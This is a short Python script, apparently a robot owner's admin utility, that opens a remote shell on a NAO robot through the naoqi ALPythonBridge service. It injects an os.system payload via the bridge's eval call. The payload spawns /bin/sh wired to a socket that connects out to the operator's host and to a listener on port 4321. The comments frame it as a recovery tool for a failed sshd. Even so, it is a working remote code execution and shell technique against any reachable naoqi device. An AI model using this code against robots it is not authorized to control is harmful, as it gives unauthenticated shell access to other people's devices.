#! /usr/bin/python

# This can be used to launch a remote shell on a robot if naoqi is running.
# Useful if sshd has crapped itself. Change hachiko.local to your machine
# name and tank.local to the robot's name. Use netcat to create listening
# socket on your own machine, and then run the script. 
# instance to cat to port 4321 on the robot.

from naoqi import ALProxy
import sys

script = """

import socket
import subprocess

out_sock = socket.create_connection(('hachiko.local', 4321))

listener = socket.socket()

listener.bind(('', 4321))
listener.listen(1)
in_sock, addr = listener.accept()

subprocess.Popen(('/bin/sh',), 0, None, in_sock.fileno(), out_sock.fileno(), out_sock.fileno())

out_sock.close()
in_sock.close()
"""

script = script.replace('\n','\\n')

payload = "__import__('os').system('echo -e \"' + \"" +  script + "\" + '\" | python')"


launcher = ALProxy("ALLauncher", "tank.local",  9559)
print(launcher.isModulePresent("ALPythonBridge"))
print(launcher.launchPythonModule("ALPythonBridge"))
pb = ALProxy("ALPythonBridge", "tank.local", 9559)
print(pb.eval(payload))
